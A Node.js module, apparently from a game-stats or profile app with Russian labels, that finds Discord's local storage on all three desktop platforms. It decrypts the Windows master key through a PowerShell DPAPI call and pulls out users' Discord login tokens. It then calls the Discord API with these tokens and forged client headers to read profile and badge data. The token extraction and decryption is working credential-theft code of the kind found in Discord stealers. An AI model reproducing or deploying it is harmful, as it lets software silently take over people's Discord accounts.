const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const https = require('https');
const { execSync } = require('child_process');

function getDiscordLevelDbDirs() {
  const dirs = [];
  const isWin = process.platform === 'win32';
  const isMac = process.platform === 'darwin';
  const isLinux = process.platform === 'linux';

  const clients = ['discord', 'discordptb', 'discordcanary'];

  for (const client of clients) {
    let p = null;
    if (isWin && process.env.APPDATA) {
      p = path.join(process.env.APPDATA, client, 'Local Storage', 'leveldb');
    } else if (isMac) {
      p = path.join(os.homedir(), 'Library', 'Application Support', client, 'Local Storage', 'leveldb');
    } else if (isLinux) {
      p = path.join(os.homedir(), '.config', client, 'Local Storage', 'leveldb');
    }
    if (p && fs.existsSync(p)) {
      dirs.push({ client, dir: p });
    }
  }

  return dirs;
}

function getWindowsMasterKey(clientName = 'discord') {
  if (process.platform !== 'win32' || !process.env.APPDATA) return null;
  const localStatePath = path.join(process.env.APPDATA, clientName, 'Local State');
  if (!fs.existsSync(localStatePath)) return null;

  try {
    const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const encKeyB64 = localState?.os_crypt?.encrypted_key;
    if (!encKeyB64) return null;

    const encKey = Buffer.from(encKeyB64, 'base64').subarray(5);
    const b64 = encKey.toString('base64');
    const psScript = `Add-Type -AssemblyName System.Security; $bytes = [Convert]::FromBase64String('${b64}'); $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); [Convert]::ToBase64String($dec)`;
    const masterKeyB64 = execSync(`powershell.exe -NoProfile -Command "${psScript}"`, { timeout: 4000 }).toString().trim();
    return Buffer.from(masterKeyB64, 'base64');
  } catch (err) {
    return null;
  }
}

function extractTokens() {
  const levelDbEntries = getDiscordLevelDbDirs();
  const tokens = new Set();

  for (const { client, dir } of levelDbEntries) {
    let masterKey = null;
    if (process.platform === 'win32') {
      masterKey = getWindowsMasterKey(client);
    }

    let files = [];
    try {
      files = fs.readdirSync(dir).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
    } catch (_) {
      continue;
    }

    for (const file of files) {
      try {
        const buf = fs.readFileSync(path.join(dir, file));
        const str = buf.toString('latin1');

        // 1. Windows encrypted token
        if (masterKey) {
          const encRegex = /dQw4w9WgXcQ:[^"]+/g;
          let match;
          while ((match = encRegex.exec(str)) !== null) {
            try {
              const encBuf = Buffer.from(match[0].split('dQw4w9WgXcQ:')[1], 'base64');
              const iv = encBuf.subarray(3, 15);
              const payload = encBuf.subarray(15, encBuf.length - 16);
              const authTag = encBuf.subarray(encBuf.length - 16);

              const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
              decipher.setAuthTag(authTag);
              let dec = decipher.update(payload, null, 'utf8');
              dec += decipher.final('utf8');
              if (dec && dec.length > 50) {
                tokens.add(dec);
              }
            } catch (_) {}
          }
        }

        // 2. Plaintext tokens (macOS / Linux / older clients)
        const plainRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}/g;
        let pMatch;
        while ((pMatch = plainRegex.exec(str)) !== null) {
          tokens.add(pMatch[0]);
        }
      } catch (_) {}
    }
  }

  return Array.from(tokens);
}

const superProps = Buffer.from(JSON.stringify({
  os: process.platform === 'win32' ? "Windows" : (process.platform === 'darwin' ? "Mac OS X" : "Linux"),
  browser: "Discord Client",
  release_channel: "stable",
  client_version: "1.0.9266",
  os_version: "10.0.26300",
  os_arch: "x64",
  app_arch: "x64",
  system_locale: "ru",
  browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9266 Chrome/130.0.6723.137 Electron/33.4.11 Safari/537.36",
  browser_version: "33.4.11",
  client_build_number: 657850,
  native_build_number: 657850,
  client_event_source: null
})).toString('base64');

function discordFetch(endpoint, token) {
  return new Promise((resolve, reject) => {
    const req = https.request(`https://discord.com/api/v9${endpoint}`, {
      headers: {
        'Authorization': token,
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9266 Chrome/130.0.6723.137 Electron/33.4.11 Safari/537.36",
        'X-Super-Properties': superProps
      },
      timeout: 6000
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          try {
            resolve(JSON.parse(data));
          } catch (e) {
            reject(e);
          }
        } else {
          reject(new Error(`HTTP ${res.statusCode}: ${data.slice(0, 100)}`));
        }
      });
    });

    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Discord request timed out'));
    });
    req.end();
  });
}

async function getLiveDiscordProfile() {
  const tokens = extractTokens();
  if (tokens.length === 0) {
    return { connected: false, error: 'No Discord login token detected on system.' };
  }

  for (const token of tokens) {
    try {
      const user = await discordFetch('/users/@me', token);
      const badgesRes = await discordFetch('/users/@me/badges', token).catch(() => null);

      let distinctGames = null;
      let playtimeHours = null;

      if (badgesRes && Array.isArray(badgesRes.badges)) {
        // Distinct Games badge (ID 21)
        const gBadge = badgesRes.badges.find(b => b.badge_id === 21);
        if (gBadge) {
          const prog = (gBadge.progress && gBadge.progress[0]) || {};
          const currentCount = typeof prog.current === 'number' ? prog.current : 0;
          const nextThreshold = typeof prog.threshold === 'number' ? prog.threshold : 20;
          const needed = typeof prog.progress_helper_text === 'string'
            ? prog.progress_helper_text
            : `Ещё ${Math.max(0, nextThreshold - currentCount)} игр`;

          // Find tier names
          const tierMap = {
            sampler: 'Пробующий (2)',
            dabbler: 'Интересующийся (5)',
            enthusiast: 'Энтузиаст (10)',
            ranger: 'Рейнджер (15)',
            explorer: 'Исследователь (20)',
            adventurer: 'Искатель приключений (30)',
            voyager: 'Открыватель (40)',
            maverick: 'Свободный дух (60)',
            polymath: 'Многосторонняя личность (80)',
            universalist: 'Универсал (100+)'
          };

          distinctGames = {
            badge_id: 21,
            owned: gBadge.owned,
            info_label: gBadge.info_label || `${currentCount} игр`,
            currentCount: currentCount,
            currentTierKey: gBadge.current_tier || 'dabbler',
            currentTierName: tierMap[gBadge.current_tier] || gBadge.current_tier,
            nextTierKey: gBadge.next_tier || 'explorer',
            nextTierName: tierMap[gBadge.next_tier] || gBadge.next_tier,
            threshold: nextThreshold,
            neededForNext: Math.max(0, nextThreshold - currentCount),
            helperText: needed,
            tiers: gBadge.tiers || []
          };
        }

        // Playtime hours badge (ID 13 or similar)
        const hBadge = badgesRes.badges.find(b => b.name && b.name.includes('часы') || b.badge_id === 13);
        if (hBadge && hBadge.progress && hBadge.progress[0]) {
          playtimeHours = {
            currentHours: hBadge.progress[0].current,
            threshold: hBadge.progress[0].threshold,
            helperText: hBadge.progress[0].progress_helper_text
          };
        }
      }

      return {
        connected: true,
        user: {
          id: user.id,
          username: user.username,
          globalName: user.global_name || user.username,
          avatar: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null
        },
        distinctGames: distinctGames,
        playtimeHours: playtimeHours
      };
    } catch (_) {}
  }

  return { connected: false, error: 'Could not authenticate with Discord API' };
}

if (require.main === module) {
  getLiveDiscordProfile().then(res => {
    console.log('Discord Live Profile:', JSON.stringify(res, null, 2));
  });
}

module.exports = {
  getLiveDiscordProfile
};
